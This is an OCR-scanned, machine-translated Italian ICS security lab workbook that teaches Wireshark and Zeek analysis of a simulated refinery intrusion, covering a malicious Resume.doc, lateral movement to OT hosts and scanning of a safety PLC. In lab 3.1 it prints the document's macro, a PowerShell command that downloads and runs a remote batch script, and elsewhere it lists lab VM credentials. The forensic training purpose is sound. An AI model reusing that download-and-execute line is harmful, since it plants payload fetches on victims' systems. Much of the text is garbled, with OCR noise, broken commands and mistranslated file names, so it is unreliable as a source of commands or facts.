 a) ic} Q 9 ic) 143.810484 10.10.0.10 192.41. i} ic} a) ic} ic) Prepara come filtro ic}
 il mio 2 B
© N b ray parr arian are wre are are ers
 Filtro di conversazione

-809158 3 2.41 Seleziona/Deseleziona pacchetto CctreM JACK] Seg=1 Ack=1 Win=65536 Len=0 143.809336 10.10.0.10 41 . doc http/1.1 b 143.809942 10.10.0.10 141 pacchetto Ignare/unignore Etre ACK] SEQ = 276 ACK = 18 WIN = 65536 LE B 143.810338 10.10.0.10 192.41 Set/Unset Time Reference Ctrl | ACK] SEQ = 276 ACK = 7318 WING = 65536 143.810431 10.10.0.10 192.41 Time Shift... CtrleshifteT [ACK] Seq=276 Ack=13158 Win=62720 CK] Seq=276 Ack=16078 Commento pacchetto... Ctrl+Alt+c
 372: 66 byte su cavo (528 bit), 66 byte et II, Src: Dell_3c:53:04 (f8:db:88:3c:53%Q
 w
 Colora conversazione SCTP
 Flusso TCP Ctrl+Alt+Maiusc+T

*Nota* Apparirà la rappresentazione ASCII del flusso TCP che ci mostrerà in dettaglio cosa stava accadendo. Ci mostra anche che il nome di dominio dell’indirizzo IP è rckwel.ru che sembra essere una versione errata di Rockwell ospitata su un dominio russo. Queste cose da sole non garantiscono che sia dannoso, ma è un punto di partenza sicuro che sarà valido per noi in questo scenario.
 Wireshark: segui il flusso TCP (tcp.stream eq 0) - itincident.pcap
 GET /Resume.doc HTTP/1.1
 Accetta: text/html, application/xhtml+xml, us ai
 Referente: http://rckwel.ru/
 Accetta lingua: en-US
 Agente utente: Mozilla/5.@ (Windows NT 6.1; Trident/7.0; rv:11.0) come Gecko Accept-Encoding: gzip, deflate
 Ospite: rckwel.ru
 Connessione: Keep-Alive
 HTTP/1.0 200 OK
 Server: SimpleHTTP/0.6 Python/2.7.18rc1 Data: venerdì 10 luglio 2020 21:35:16 GMT Tipo di contenuto: application/msword Lunghezza contenuto: 265728
 Ultima modifica: venerdì 10 luglio 2020 21:19:16 GMT

*Risposta* L'indirizzo IP è 192.41.148.220 e il dominio è rckwel(punto)ru in comunicazione con 10.10.0.10
 2. Qual è il nome del file che potrebbe essere dannoso? Curriculum vitae.doc

*Nota* Con la finestra Segui flusso TCP ancora aperta dall'ultima domanda possiamo vedere che c'è anche un file Resume.doc che è stato trasferito al sistema nella nostra rete. Ciò è sospetto nel contesto, ma vorremmo saperne di più prima di dire che probabilmente è dannoso. Potremmo ritagliare il file e analizzarlo, ma tutto ciò di cui abbiamo bisogno potrebbe anche essere qui nel traffico.

© 2021, Robert M. Lee Lab 3.1-4

@) (@

)

‘> re e e ® (= ®) (=)
 cioè ww a

"5"
 15 G!
 45
 GET /Resume.doc Accept: text/html, Referer: http://rckwel.ru/ Accept-Language: en-US User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) come Gecko Codifica accettata: gzip, deflate
 Ospite: rckwel.ru
 Connessione: Keep-Alive
 n/xhtml+xml, */*
 HTTD/41 A PAA NK
 3. Di quale comune utilità Windows si abusa nel documento? powershell

> Continua a rivedere il flusso TCP
> Identificare i caratteri ASCII leggibili che possono essere facilmente osservati

*Nota* Troverai del testo interessante nella parte inferiore della finestra.
 sie il ]...&. {9BA95972-F6A8-11CF-
 Aaa2-QGAGC9OABF39} . X. cmq. exe. /e Honsohartre IWR -uri “https:// raw.githubusercontent . cany redébnaryoovatoalie red- team/master/ARTifacts/Chain. _Reactions/chain_reaction_DragonsTail.bat" - OutFile epee beentea ay OAi: bat" ; ~\Documenti\carico utile. bat... C:\Windows\System32. .
 sito st BRR. Res y ive Peet Ree ere reer hr tos . PW Bi soggezione \rootesccs
\cimv2. .$.6. ..Avvio.. +H. -@. .H.C.L + -winmgmts: sta EB saaics te \root .Process. '$s. 6. 'oma. exe cioè "powershell. exe TEX. ( “IWR suri HU a di
 raw.githubusercontent. con/reicanaryoo/atoni red-team/master/ARTifacts/Chain \_Reactions/chain_reaction_DragonsTail.psi').
 oH, [eRe oN BOP i ss ccae'c Densecersecsven Ororsveccecreces Vedi ree AG@O..... ABP... ss AGO..... ABP cae => Banee wae pa age Attribut.e VB_Nam.e = nad . ulei”
 S.ub Aa bagabecior eatetchiCinaaoiee: -Pr.v4()
+-Const .ShellwinPdows.._.6".{9BAQ597 .2-F6A8-1.1CF-A442. -Q@AOC90 .ASF39}.v.1.Se.GW.=Get .Object(".new:" &

_@). Elemento, .S.W.Docume.nt.Appli.cation,...Exec,."cm.d.exe", ."/c powe.rs.Y. IWR. -uri “".https://.raw. gith.ubuserco.nt./com/r.edcanary.co/atomi.c-. -team./master/.ARTifact.s/Chain_.Re...Is/ e.....0.0 Dran...Tail ba.t®" -Out File F~\.k.s\navina?d. . :

*Nota* C'è molto interesse da esplorare qui, ma il più interessante è il file powershell.exe e il file Dragonstail.bat. Queste sono le stringhe di strumenti e comandi presenti nel documento Word mentre veniva trasferito attraverso la rete. Powershell è un'utilità nativa di Windows comunemente abusata, fornita da numerosi attori statali e criminali. Ci aiuta a capire che Resume.doc è dannoso e sta spostando nella rete file che normalmente gli avversari tentano di ottenere credenziali elevate e spostarsi nella rete.
 4. Quali sono altri due file probabilmente dannosi che contribuiscono a dimostrare che si tratta di un'intrusione di Fase 1?
 cip_plc_information.exe
 cip hmi_emulator.exe

> Cancella tutti i filtri aperti

*Nota* Poiché sappiamo che sono in corso trasferimenti di file di interesse nell'acquisizione dei pacchetti, possiamo verificare se ci sono file di interesse.

© 2021, Robert M. Lee Lab 3.1-5
>

> Fare clic su HTTP...

*Nota* Ci sono molti file in questa acquisizione di pacchetti, il che non è raro nel traffico di rete. Tuttavia, gran parte di esso riguarda il dominio rckwel.ru, il che significa che molti di questi probabilmente meritano di essere compresi. Per prima cosa cerchiamo gli evidenti punti di forza. Ordinare i file facendo clic sulla colonna Nome file. Quando lo facciamo, vediamo un numero
 Esporta oggetti HTTP
> Fare clic su File
> Passa il mouse sopra Esporta oggetti
 Salva come...
 Modifica Visualizza Vai Cattura Analizza Statistiche Telefonia Wir
 Opel
 Aperto di recente
 Unisci...
 Importa da dump esadecimale... Chiudi
 Insieme di file
 Esporta pacchetti specificati...
 Esporta dissezioni di pacchetti Esporta byte di pacchetti... Esporta PDU su file...
 Esporta chiavi di sessione TLS...
 Esporta oggetti
 Stampa...

_Esentato
 Ctrl+o % Ko o¥l :
 Destinazione 10.10.255.2 Ctrl+w | 224.0.0.252
| 224.0.0.252
| 224.0.0.252 Ctrl+Maiusc+S | 9594 6.0.252
»| 224.0.0.252
-} 224.0.0.252| 224.0.0.252
>| 224.0.0.252
. | 10.10.255.2 Ctrl+Maiusc+x | 49.19.255.24192.41.148.
 CTRL+P | HTTP. Ctrl+Q | FMI. PMI.
|
| TTP.
 10.10.6.10
 DICOM...
 di file interessanti tra cui il file Resume.doc originale ma anche file a tema Rockwell come RSLINX.exe e FTActivationBoost.exe
 Pacchetto 85131 32853 37594 46461 20442 25920 50603 597 737
 Nome host
 rckwel.ru rckweLru rckweLru rckwelru rckwel.ru rckweLru rckwel.ru rckwel.ru 1

+
 Wireshark - Esporta - Elenco oggetti HTTP
 Contenuto Digitare testo/semplice
 applicazione/x-msdos-p... applicazione/x-msdos-p... applicazione/x-msdos-p... applicazione/x-msdos-p... applicazione/x-msdos-p... applicazione/x-msdos-p...
 applicazione/parola chiave
 Dimensione 40 byte
 5.134 kB 5.138 kB 5.134 kB 5.137 kB 5.135 kB 5.135 kB 265 kB
 applicazione/flusso di ottetti 64 byte

_ Nome file: : re
 BootpServer.exe ControlFLASH.exe FTActivationBoost.exe
 RADrvDBMgr.exe
 beh
 Questi file potrebbero essere applicazioni legittime o contenenti trojan. Quando fai clic su uno dei nomi di file, verrai portato al punto dell'acquisizione del pacchetto in cui si trova.

© 2021, Robert M. Lee
 Laboratorio 3.1 -6
 2,

=)
 m™ oe > ® ®) e) () ®) (®) (®) (®) (eo) (@)
 ii) un ee
 sì ww
 rr a
 oe ww Ww

<p'

> Fare clic su RSLINX.exe
 85131 testo/semplice 40 byte
 32853 rckwel.ru application/x-msdos-p... 5,134kB | BootpServer.exe 37594 rckwel.ru application/x-msdos-p... 5.138 kB — ControlFLASH.exe 46461 rckwel.ru application/x-msdos-p... 5.134 kB — FTActivationBoost.exe 20442 rckwelru application/x-msdos -p... 5.137kB = RAComSrv.exe
 25920 rckwel.ru ... 5.135 kB
 rckweLro
 iApplica un filtro anti-disjay
 oO. Sorgente ora 50592 437, 199192 192.41.148,220 50593 437.190194 10.19.0.108 50594 437.190199 192.41.148.220
 50595 437. 190200 10.10.0.190 597 eckweLru applicazione/msword 265 kB Resume.dd 50596 437.190209 192,41.148.220 737 rckwel.ru applicazione/octet-stream 64 byte __utm.gif 50597 437 .190214 192.41.148.220 748 rckwel.ru applicazione/ottetto -stream 64bytes __utm.gif 50598 437.190221 192.41.148.220 759 rckwel.ru applicazione/octet-stream 64 byte __utm.gif 50599 437.190227 192.41.148.220 770 rckwel.ru applicazione/octet-stream 6 4bytes __utm.gif 50600 437.199234 192.41.148.220 781 rckwel .ru applicazione/octet-stream 64 byte __utm.gif 50601 437.190350 10.10.0.10 792 rckwel.ru applicazione/octet-stream 64 byte __utm.gif 50602 437.190358 10.10.6.10 803 rckwel.ru applicazione/octet-stream 6 4 byte __utm.gif 59603 437.191671 192-41.149; 220 813 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif 50604 437. 191875 10.19.9.10 824 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif
> Esamina il flusso del pacchetto selezionato
> Ridurre a icona la finestra dei file
> Fare clic con il tasto destro sul pacchetto selezionato
> Segui > Flusso TCP
> Rivedi lo stream Iv.i0.0.19 I9Z. 41, 148.2209 CF UF DI9IS SU [ACK] Seq= | 192. 41.148.220 TcP 54 [TCP visions Update] 5 18 HTTP/1.0 260 OK (app een Packet CtrlemM 54 51553 ~- 80 [ACK] Seq=
 Ignora/Non ignora il pacchetto Ctrl+D
 Ethernet II, Src: Sarian_ 20:8) da set/Unset Time Reference ctrlat (f8:db:88:3c:53:04)
 Protocollo Internet Ve
 h : Time Shift... Ctrl+shift+T en 2 Commento pacchetto... Ctrl+Alt+c 6475(1460) #46476(1460) Edi L d Nome
 Tipo edia

"Applica come filtro"
 f8db
 Prepara come filtro » Filtro conversazione Colora conversazione SCTP
 Vendita controllo TCP Stream! ame (618 byte) | | TcP riassemblato (1352 ~ oe an seamccmm| TLE S a Preferenze protocollo >| flusso uTTP Ctrleale!
 7 _ itincident.pcap
 Decodifica come... i

*Nota* Come abbiamo fatto in precedenza, cerca rapidamente tra i dati ASCII per identificare le sezioni leggibili dall'uomo e vedere se c'è qualcosa di interessante.

© 2021, Robert M. Lee Lab 3.1-7 è). -UPhlb) o... dw, + )...urllib.error).r....i-w..i -urllib.parse).r....i.]..i- 2..) ...urllib.request).r....if{...i.z..)..-urllib. risposta). REE 1 dere t pera pened TD Lg cura hy Were sano di mente Bert
 browser web).r....i-.
 Tk -)....xmL).7....i.Ts.d... xml.parsers).r....i.V.......)....xml.parsers.expat). r....vos) os oXML. SAX)... 1<X.. i. xml. sax._exceptions) wA..i....)...xml.sax.expatreader).r. Be gs Bee Sheen eek ndler).r....i>|..
 o .xml,sax.saxutils).r. B. .xml.sax.xmlreader).r....i. -zipfile);r....i. 4
 mpyimod@1_os_path.......
...H..mpyimod03_importers 4
.8 informazioni_scip_plc.
 vedi eeneeee e.mstruct..
$} .mpyimod02_archive. .
©..3....L...0.spyiboote1_bootstrap
 Po.

$ 8. bYCRUNTIME140.d11l... : B. )_bz2.pyd... )_ctypes.pyd......
‘ * “ b_lzma.pyd. *b_socket.pyd. cip pic informa exe manifest.... 1052} +..2 .b1Libss.
,..Z..bseleziona .pyd....... @..NH....
 nome cip_plc_information.exe.manifest......-...-+-++++++
. Pipì 1S BE + 2PYZ-@8.pyz.
 4 .xbase_library.zip. oo eshe op Die te bu wwe 'python37.dll..
 1 pacchetto client, 1 pacchetto server, 1 turno. Intera conversazione (5.135 kB) * Mostra e salva i dati come ASCII bil

*Nota* Alla fine dei dati ci sono riferimenti a Python che difficilmente viene utilizzato dall'applicazione Rockwell in un I.C.S. ambiente. Inoltre, all'interno dell'eseguibile sono presenti file eseguibili incentrati su CIP, che è un protocollo sfruttato da Rockwell e altri, e PLC. Il file “cip_plc_information.exe" è qualcosa che segnaleremo per ulteriori analisi e ci aiuta anche a capire che se l'avversario sta sfruttando questa capacità probabilmente vedremo un'interazione diretta tramite CIP con i nostri PLC. Si tratta molto probabilmente di un sistema I.C.S. capacità su misura e non solo un I.C.S. uno a tema.

> Cancella i filtri esistenti e torna a File > Esporta > HTTP...
> Ripeti il ​​passaggio precedente per altri eseguibili come FTActivationBoost.exe
 AW crea J. xml, Sax).F...-4AX.- 1.sax.handler).r....iC]..i yO ES CL eee Oy mere
 Joxml). F.1d Ts sds sss )++ XML, parser).r...-i-Ve.-- xml.sax._exceptions) iA. .io

.xml.sax.saxutils).r....iM oavians ae mee e€.mstruct.. 8
$}.mpyimod@2_archive..........5-
.L...0.spyiboot01_bootstrap ‘ . )_mit
$ 8. bVCRUNTIME140.d11... alee -b_bz2. .b_ctypes.pyd......
 F - - _ssl.pyd... beip_hmi_emulator.exe.manifest
..!. .bliberypto-1_1.d11 con btacess« 2 .blibssl-1_1.dl1l... bpyexpat .pyd...... ah p..7...bpython37.dll. ...-@..bunicodedata.pyd.......6e.seeeeeeee ard 49 . opyi-windows -mat cs
@. .xbase_library.zip... noi J ALJ... .. +. Sopython37.d1l 1 pacchetto client, 1 pacchetto server, 1 turno. Intera conversazione (5.134 kB) Ns Mostra e salva i dati come ASCIl x

*Nota* Ancora una volta, identifichiamo alcuni eseguibili sospetti basati su CIP, in questo caso cip_hmi_emulator.exe. Questi file non sono immediatamente dannosi ma altamente sospetti in quanto eseguibili incorporati nel codice Python ed entrambi gli eseguibili. A questo punto è sicuro e accurato presumere che si tratti di malware.

© 2021, Robert M. Lee Lab 3.1-8

(3) (3) oe awe @) a) ) (?) (®) @®) ®) ee @®

(3)
 ao,
 oe, ip è is
 ip!
 ip'

‘5!
 e GS
 Laboratorio 3.2 - Indagine sulle intrusioni di Fase 2 _
 e Distinguere le intrusioni della Fase 2 dalle intrusioni della Fase 1 e __ Sfruttare l'analisi del traffico per seguire le intrusioni e Identificare gli artefatti e gli indicatori chiave delle intrusioni

*Informazioni sullo scenario* Dopo aver stabilito che il sistema Enterpise1 era compromesso e stava comunicando con un server C2, il team ha deciso di passare rapidamente alla rete OT. In qualità di membro del team di rilevamento delle minacce, devi determinare se sono presenti sistemi compromessi nella rete OT e qualsiasi informazione che puoi raccogliere nella raffineria di Calistoga per determinare se è necessario eseguire una risposta agli incidenti.
 Questo esercizio utilizzerà il tuo RELI.C.S. VM e il file otincident.pcap nella cartella I.C.S.515 sul Desktop del
 1. Quale nuovo sistema sta comunicando con 192.41.148.220?
 2. In che modo il sistema è stato probabilmente compromesso e ci sono altri sistemi probabilmente compromessi?
 3. Qual è il nome del file di progetto dannoso?
 4. Qual è la dimensione massima del file RSLINX.exe e qual è la dimensione del file Resume.doc?
 5. Perché questa intrusione rientra nella Fase 2?

© 2021, Robert M. Lee Lab 3.2 -1 Compito: analizzare le comunicazioni della rete OT
 1. Quale nuovo sistema sta comunicando con 192.41.148.220? 10.10.10.30

> Inizia il tuo RELI.C.S. VM

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Naviga nel Terminale fino a ics515 > calistogarefinery > pcaps
> — Nel Terminale esegui il comando: cd Desktop/ics515/calistogarefinery/pcaps/
 € cd Desktop/ics515/calistogarefinery/pcaps/
 itincident.pcap normalops.pcap otincident.pcap

> Esegui Zeek sul file otincident.pcap
> Nel Terminale esegui il comando: zeek -C -r otincident.pcap
 ent.pcap

*Nota* Questo legge il pcap rispetto allo strumento Zeek che poi lo analizza automaticamente in base alla configurazione di Zeek. In questo caso non stiamo utilizzando Zeek come sistema di rilevamento delle intrusioni ma invece come linguaggio di scripting di rete, produrrà automaticamente log, molto simili nel processo di pensiero a syslog per il traffico di rete, che possiamo poi esaminare per rispondere alle domande che abbiamo Avere.

> Analizza le comunicazioni con 192.41.148.200
> Eseguire il comando seguente nel Terminale cat conn.log | zeek-cut id.orig_h id.resp_h | grep192.41.148.22 | ordinare | unig
> Determinare il nuovo indirizzo IP

$ cat conn.log | zeek-cut id.orig_h id.resp_h | grep192.41.148.22 | ordinare | unico 10.10.0.10 192.41.148.220
 10.10.10.30 192.41.148.220 192.41.148.2268 10.10.16.36

© 2021, Robert M. Lee Lab 3.2 -2

@) (®) @) (@) @@) )

(®) Ss
 4

*Nota* Questo comando legge i log di connessione e utilizza i log ASCII Zeek per selezionare le informazioni designate come gli indirizzi IP di origine e di risposta; quindi cerca anche l'indirizzo IP in cui volevamo trovare le comunicazioni (192.41.148.22) e lo ordina visualizzando solo valori univoci. Questo è molto più veloce che setacciare Wireshark.

*Answer™ Sapevamo già dell'indirizzo 10.10.0.10 ma non sapevamo dell'indirizzo IP 10.10.10.30 (in base alla precedente comprensione del diagramma di rete).
 2. In che modo il sistema è stato probabilmente compromesso e ci sono altri sistemi probabilmente compromessi?
 RSLINX.exe e beacon.exe sono stati spostati lateralmente dal sistema IT
 10.10.10.20

*Nota* Zeek crea automaticamente numerosi file di registro durante l'analisi del traffico di rete. Uno di questi file di registro è files.log che estrae i vari file che attraversano il traffico di rete in modo simile alla funzione Esporta di Wireshark.> Analizza i file per vedere se è stato trasferito qualcosa a 10.10.10.30
> Esegui il seguente comando nel Terminale
 file cat.log | zeek-cut tx ospita rx_hosts nome file sorgente | grep 10.10.10.30
 file cat.log | zeek-cut tx_hosts rx_hosts nome file sorgente | grep10.10.10.30 192.41.

\\Amministratore\\b
\\Amministratore\ \b

*Risposta* Qui vediamo che 10.10.0.10 (sistema IT) sta trasferendo file a 10.10.10.30 (sistema OT) tramite SMB e che ci sono una serie di file interessanti come RSLINX.exe e beacon.exe. Tutto ciò probabilmente rappresenta un movimento laterale.

*Nota* Sapendo che 10.10.0.10 sta eseguendo il movimento laterale possiamo vedere se ci sono altri sistemi oltre al solo 10.10.10.30 infetti eseguendo lo stesso comando di prima ma facendo perno sull'infrastruttura che l'avversario sta utilizzando internamente alla nostra rete (. 10).

© 2021, Robert M. Lee Lab 3.2 -3
> Analizza altri file trasferiti da 10.10.0.10
> Eseguire il seguente comando nel terminale cat files.log | zeek-cut tx_hosts rx_hosts nome file sorgente | grep10.10.0.10
 Admin\\Desktop\\share\\flexsvr.exe Admin\\Desktop\\share\\flexsvr.exe: Zona. Identificatore Admin\\Desktop\\share\\FTActivationBoost.exe Admin\\Desktop\\share\\FTActivationBoost.exe Admin\\Desktop\\share\\FTActivationRoost.exe:Zone.id Admin\\Desktop\\share\\ nxlog-ce-2.10.2150.msi Admin\\Desktop\\share\\nxlog-ce-2.10.2150.msi Admin\\Desktop\\share\\nxlog-ce 10.2150.msi:Zone.I Admin\\Desktop \\share\\RAComSrv.exe Admin\\Desktop\\share\\RACo v.exe Admin\\Desktop\\share\\RAComSrv.exe: Zona. Identificatore Admin\\Desktop\\share\\RAComSrv.exe Admin\\Desktop\\share\\radmin.exe Admin\\Desktop\\share\\radmin.exe Admin\\Desktop\\share\\radmin. Admin\\Desktop\\share\\ vDBMgr Admin\\Desktop\\share\ rvDBMgr .e Admin\\Desktop\\share\\RADrvDBMgr .ex ne.Identi Admin\\Desktop\\share\\
 Ammin\\D: op\\condividi\\R
 Admin\\Desktop\\share\\R Admin\\Desktop\\share\\Resume (1).doc:Zo Identifie Admin\\Desktop\\share\\Resume ( Admin\\Desktop\\share\\Re Admin \\Desktop\\condivisione\\Resume.:Identificatore zona Admin\\De p\\share\\RSLINX Admin\\Desktop\\share\\RSLINX.

*Risposta* È chiaro che gli stessi file dannosi e alcuni altri come flexsvr.exe vengono trasferiti su 10.10.10.20 un altro I.C.S. dispositivo.
 3. Qual è il nome del file di progetto dannoso?
 BurnerManagementinfetto.ACD

*Nota* Possiamo esaminare tutto, ma concentriamoci sulle comunicazioni SMB poiché vengono comunemente abusate per il movimento laterale.

> Analizzare i file trasferiti tramite SMB al 10.10.10.30
> Eseguire il seguente comando nel terminale cat smb files.log | zeek-cut id.orig_h id.resp_h nome | grep 10.10.10.30

© 2021, Robert M. Lee Lab 3.2-4
 eo ra) = jf cm
 UN]
 o
 i] ip

'S
 7 e.e

<B
 4s ae come «s come come «Ss come

“,
 COME
 S$ cat smb_files.log | zeek-cut id.orig_h id.resp_h nome | grep 10.10.10.30 3 \\srvsve

\\wkssve

\\srvsve

\\wkssvc

\\srvsve
 B.0

\\Amministratore\\Desktop\\condividi\\RSLINX. exe

\\Pubblico\\desktop.int
\\Amministratore\\Desktop\\BurnerManagementInfected.ACD
\\Amministratore\\Desktop\\BurnerManagementInfected.L5K

*Risposta* Avresti potuto vederlo anche nell'altro comando, ma sapendo che i file venivano trasferiti tramite SMB questo era il modo più semplice/pulito per ottenere la risposta. I file .ACD e .L5K infetti da BurnerManagement sono quelli che desideriamo; ne registreremo uno ai fini della risposta, ma uno dei due sarebbe corretto e vorremmo estrarli entrambi per l'analisi successiva.
 4. Qual è la dimensione massima del file RSLINX.exe e quale è la dimensione del file Regume.doc? 265728 byte___
 5135056 byte

> Determina la dimensione dei file utilizzando Zeek
> Eseguire il seguente comando nel terminale cat files.log | zeek-cut nome file byte totali | grep Curriculum vitae.doc
> Registra la risposta Esegui il seguente comando nel Terminale cat files.log | nome file zeek-cut total_bytes | grepRSLINX.exe
> Registra la risposta
 file cat.log | nome file zeek-cut total_bytes | grep Resume.doc dmin\\Desktop\\share\\ 265728 dmin\\Desktop\\share\\ :Zone. Identificatore
 file cat.log | nome file zeek-cut total_bytes | grepRSLINX.exe
\Amministratore\\Desktop\\condividi\\ 5135056
\Admin\\Desktop\\share\\ :Zone.Identifier: Kdmin\\Desktop\\share\\ 5135056 dmin\\Desktop\\share\\ 5135056 dmin\\Desktop\\share\\ :Zone. Identificatore

*Risposta* RSLINX.exe è di circa 5.135.056 byte e Resume.doc è di circa 265.728 byte. Si traduce anche rispettivamente come 5.138 kB e 265 kB.

© 2021, Robert M. Lee Lab 3.2-5 5. Perché questa intrusione è un'intrusione di Fase 2? Domanda a risposta a perta
 L’intrusione è chiaramente focalizzata sull’I.C.S. porzione della rete. L'intrusione nell'Enterprise si qualifica come un'intrusione di Fase 1 perché c'era un obiettivo dimostrabile da parte dell'avversario di entrare nell'I.C.S. reti, non prendono di mira solo le reti aziendali che sono un'azienda industriale. L'intrusione è proseguita fino all'accesso alla postazione di ingegneria dell'I.C.S.e non si tratta di un'infezione accidentale; è chiaro dai file a tema Rockwell e dal posizionamento sulla Engineering Workstation che l'avversario si trova nella fase di sviluppo della fase 2 dell'I.C.S. Cyber ​​Kill Chain oppure sono già pronti e pronti per l'attacco
(il che significa potenzialmente che hanno già avuto accesso all'ambiente per lo sviluppo delle capacità, ma questo non è certo).

© 2021, Robert M. Lee Lab 3.2 -6
 eo
 a ae a, @ @) @ @ @ @

)
 UN @ @
 buongiorno, @
 an@vn a
 era cioè
 È!
 È

~~ — __ 7» ed “7 “s “Bp iB’

==

_Lab 3.3 — Analisi del traffico della manipolazione del controllo
 e Sfruttare l'analisi del traffico per facilitare l'analisi delle cause profonde e Identificare la manipolazione del controllo attraverso l'analisi del protocollo

*Informazioni sullo scenario* La rete OT è decisamente compromessa e mentre formiamo il team di risposta agli incidenti è importante fare quante più analisi possibili per supportare l'indagine. A questo punto siamo estremamente preoccupati per le comunicazioni ai controllori e ai sistemi che gestiscono il sistema di sicurezza e dobbiamo determinare se sono in corso manipolazioni o modifiche.
 Preparazione agli esercizi
 Questo esercizio utilizzerà il tuo RELI.C.S. VM e il file otincident.pcap nella cartella ics515 sul desktop della VM.
 1. Qual è la prima tattica che l'avversario mette in atto contro il PLC?
 2. Quali porte ha aperte il PLC?
 3. Qual è lo strumento utilizzato per interagire con il PLC?
 4. Qual è la causa principale dell'impatto sulla struttura?
 5. Quando il PLC va offline e perché è probabile che venga ancora visualizzato in rete?

© 2021, Robert M. Lee Lab 3.3-1 Compito: analisi del traffico;
 1.

*Nota* Con la Engineering Workstation chiaramente compromessa a questo punto è fondamentale identificare il
 Qual è la prima tattica che l'avversario mette in atto contro il PLC? Scansione

> Inizia il tuo RELI.C.S. VM

> Accedi alla VM
> ACCEDI=xreliquie
> PASSWORD = reliquie

> Apri otincide.pcap in Wireshark
> Apri la cartella I.C.S.515 situata sul desktop e poi vai a calistogarefinery > pcaps
> Fare doppio clic su otincident.pcap per aprire il file in Wireshark

> Analizza le comunicazioni da e verso il PLC 10.10.20.10 Crea un filtro in Wireshark per ip.addr==10.10.20.10 Seleziona Statistiche > Conversazioni
 Limita al filtro di visualizzazione
 Passare alla scheda TCP
 Revisione per qualsiasi cosa anormale
 VVVVV
 impatto potenziale. Le workstation di ingegneria hanno un ruolo importante nella programmazione della logica dei PLC. Dall'inventario e dalla topologia delle risorse sappiamo che 10.10.20.10 è uno dei Rockwell ControlLogix della struttura
 PLC e che svolge il ruolo di PLC di sicurezza per il sistema di gestione del bruciatore. È importante vedere se
 si sta svolgendo qualsiasi attività dannosa. In alcune strutture una workstation di ingegneria non avrà comunicazioni coerenti con il PLC, comunicando solo quando vengono apportate modifiche, in alcune strutture tuttavia potrebbero esserci comunicazioni coerenti. Quindi i dati storici, che non abbiamo in questo scenario, per questa struttura sarebbero molto importanti per diagnosticarlo rapidamente. Per noi dovremo lavorare con quello che abbiamo.
 File Modifica Visualizza Vai Acquisisci Analizza Statistiche Telefonia Strumenti wireless Guida
 40640 MR ROVERE OVALE
 io è) Wy

(W]ip.addr==10.10.20.10
 N. Ora 2 Sorgente - _ Destinazione ace a Protocollo Li
| 1293..1752.394388 10.10.20.10 ~~ 40.10.10.30TCP
| 1293... 1752.399433 10.10.20.10 10.10.10.30 cIP
| 1293... 1752.578633 10.10.10.30 10.10.20.10 TCP A902 414759 7ADOAA 18 416 49 26) Af 40 9 46 Js Pa
© 2021, Robert M. Lee Lab 3.3-2

(2)

“beh
 piano cottura) a
 Ty
 Cp “a

'UN
 Cattura le proprietà del file
 Risolti gli indirizzi delle conversazioni sulla gerarchia del protocollo
 18:..28 1
 10.20.1 Endpoint 10.10. Lunghezze pacchetto 10.10.3'
 10.20.1; /OGrafico
 10.20. 1 Tempo di risposta del servizio
 Wireshark - Conversazione}
 Ethernet-3 IPv4-3 IPv6 | TCP-86 | UDP-4
 IndirizzoA * PortaA IndirizzoB PortaB _—Pacchetti ~— Byte _~—— PacchettiA>B ByteA>B 10.10.10.20 54741 10.10.20.10 44818 35.607 3.970k 17.635 2,00 10.10.10.20 57617 10.10.20.10 21 4 252 2 1 10.10. 10.20 57620 10.10.20.10 22 4 252 2 | 10.10.10.20 $7623 10.10.20.10 23 4 252 2
 70.10.10.20 57625 10.10.20.10 25 4 252 anni }

| 10.10.10.20 57628 10.10.20.10 80 14 820 8
 10.10.20.20 57630 10.10.20.10 135 4 252 2
 10.10.20.20 57632 10.10.20.10 139 4 252 2
 10.10.20.20 57634 10.10.20.10 443 4 252 2
 10.10.10.20 $7636 10.10.20.10 445 4 252 2

*Nota* Le comunicazioni tra un PLC e il relativo software di controllo sono spesso abbastanza prevedibili. Non è giusto dire che sono coerenti e che vale la pena indagare su qualsiasi anomalia, non sono comunicazioni statiche come a volte la gente vorrebbe credere. Ma generalmente sono coerenti. Qui vediamo che ci sono le comunicazioni della porta TCP 44818 per EthernetIP/CIP che ci aspetteremmo. Ma ci sono anche molte altre porte a cui accede il 10.10.10.20 (Factory Talk View HMI) con 4 pacchetti ciascuna. Un controllo su chi sta inviando cosa rivelerà che 10.10.10.20 sta inviando 2 pacchetti a 10.10.20.10 (PLC di sicurezza) ciascuno a 132 byte che rispondono con 2 pacchetti ogni volta da 120 byte. Questo è molto caratteristico dell'attività di scansione.

> Analizzare la potenziale attività di scansione Selezionare una delle potenziali scansioni Fare clic con il tasto destro
 Applica come filtro > Selezionato > A<->B Minimizza la finestra Conversazioni Esamina il traffico
 VVVVV

© 2021, Robert M. Lee Lab 3.3-3
~ Informazioni sulla lunghezza del protocollo FCP. 66 $7638 + 185 [SYN] Seq=9 Win-8192 Len=<
' ho dato un colpetto a W
 Destinazione

*Nota* Sta chiaramente scansionando il punto in cui 10.10.10.20 invia una richiesta SYN a una porta su 10.10.20.10 che è chiusa, quindi risponde con un pacchetto RST, ACK.

*Rispondi* Scansione
 2. Quali porte ha aperte il PLC? 44818
 80

> Rivedi nuovamente le conversazioni del 10.10.20.10 Applica il filtro ip.addr==10.10.20.10 Vai a Statistiche > Conversazioni Seleziona la scheda TCP
 Ordina in base alla colonna Pacchetti
 Esaminare i risultati
 VVVVWV
 Wireshark - Conversazioni
 Ethernet-3 IPv4-3 IPv6 TCP-86 | UDP-4 Indirizzo A Porta A Indirizzo B Porta B Pacchetti * Byte Pacchetti A>B Byte A>B 10.10.10.20 54741 10.10.20.10 44818 35.607 3.970k 17.635 2.000 10.10.20.10 44818 10.10.10.30 174 6 25.615 4.412k 12.886 2,42 10,10 .20.10 44818 10.10.10.30 1511 25.051 5.621k 12.567 2.831 10.10.10.20 64672 10.10.20.10 44818 117 30k 57 6,5 10.10.20.10 448 18 10.10.10.30 1746 31 4.839 15 2,5 10.10.10.20 59845 10.10.20.10 44818 19 1.790 10 od 10.10.10.20 59273 10.10.20.10 44818 19 1.790 10 9 10.10.10.20 51472 10.10.20.10 44818 17 1.589 9 8 10.10.10.20 57628 1 0.10.20.10 80 14 820 8 a 10.10.10.20 57811 10.10.20.10 44818 12 71Z 6 3 10.10.10.20 51394 10.10.20.10 44818 11 805 6 4 10.10.10.20 58436 10.10.20.10 44818 11 856 6
